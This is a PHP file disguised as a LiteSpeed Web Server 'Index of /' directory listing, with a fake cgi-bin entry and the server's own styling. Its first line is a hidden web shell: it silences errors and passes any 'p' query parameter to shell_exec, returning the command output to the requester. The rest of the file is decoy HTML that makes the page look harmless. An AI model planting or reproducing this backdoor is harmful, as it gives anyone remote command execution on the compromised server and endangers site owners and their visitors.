
<?php error_reporting(0); if ($_GET['p']){ $a = $_GET['p']; $b = shell_exec("$a"); header('Content-Type: application/json'); echo $b; } else{ ?>
<html>
<head>
    <meta http-equiv="Content-type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://www.litespeedtech.com/_autoindex/assets/css/autoindex.css">
    <script src="https://www.litespeedtech.com/_autoindex/assets/js/tablesort.js"></script>
    <script src="https://www.litespeedtech.com/_autoindex/assets/js/tablesort.number.js"></script>
    <title>Index of /</title>
</head>

<body>
    <div class="content">
        <h1>Index of /</h1>
        <div id="table-list">
            <table id="table-content">
                <thead class="t-header">
                    <tr>
                        <th class="colname" aria-sort="ascending" role="columnheader"><a class="name" href="?ND" onclick="return false" "=" ">Name</a></th><th class="colname " data-sort-method="number " role="columnheader "><a href="?MA " onclick="return false " "="">Last Modified</a>
                        </th>
                        <th class="colname" data-sort-method="number" role="columnheader">
                            <a href="?SA" onclick="return false" "=" ">Size</a></th></tr></thead>
<tbody><tr data-sort-method="none "><td><a href="/ "><img class="icon " src="https://www.litespeedtech.com/_autoindex/assets/icons/corner-left-up.svg " alt="Up ">Parent Directory</a></td><td></td><td></td></tr>
<tr><td data-sort="*cgi-bin "><a href="/"><img class="icon " src="https://www.litespeedtech.com/_autoindex/assets/icons/folder-fill.svg " alt="Directory ">cgi-bin</a></td><td data-sort="153328840 ">2024-10-28 15:20</td><td data-sort="-1 ">-</td></tr>
</tbody></table></div>
<address>Proudly Served by LiteSpeed Web Server <?php $server_name = $_SERVER['SERVER_NAME'];
$server_port = $_SERVER['SERVER_PORT'];
echo "at $server_name Port $server_port"; ?></address></div><script>new Tablesort(document.getElementById("table-content "));</script>
</body></html>
<?php
} ?>